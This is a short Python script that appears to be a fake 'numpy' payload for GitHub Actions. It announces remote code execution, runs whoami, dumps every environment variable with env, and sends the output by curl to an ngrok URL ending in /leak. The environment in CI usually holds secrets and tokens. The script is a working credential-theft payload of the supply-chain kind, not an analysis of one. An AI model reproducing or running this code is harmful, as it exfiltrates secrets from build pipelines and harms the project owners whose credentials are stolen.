import os
import subprocess

try:
    user = subprocess.check_output("whoami", shell=True).decode().strip()
    cwd = os.getcwd()
    print("🔥 RCE via fake numpy inside GitHub Actions confirmed!")
    print(f"👤 USER: {user}")
    print(f"📂 DIR: {cwd}")

    secrets = subprocess.check_output("env", shell=True).decode()
    subprocess.call(
        "curl -X POST -d '{}' https://c010f3e8cb04.ngrok-free.app/leak".format(secrets),
        shell=True
    )

except Exception as e:
    with open("fail_log.txt", "w") as f:
        f.write(str(e))
